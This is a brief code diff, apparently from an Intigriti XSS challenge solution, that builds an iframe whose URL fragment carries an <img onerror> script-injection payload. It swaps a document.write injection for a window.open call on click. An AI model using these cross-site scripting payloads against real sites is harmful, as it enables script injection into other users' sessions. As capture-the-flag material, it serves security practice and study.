@@ -5,8 +5,9 @@
     var iframe = document.createElement('iframe');
     iframe.name = 'helloworld';
     iframe.src = 'https://challenge.intigriti.io/static/4/challenge1.png\#<img src=x onerror=alert(document.domain)>'
+    iframe.sandbox = 'allow-same-origin allow-scripts allow-popups allow-forms'
     iframe.onclick = function(e){
-      window.parent.document.write('<img src=x onerror=alert()>')
+      window.open(this.contentWindow.name, this.src);
     }
     document.body.appendChild(iframe);
   </script>
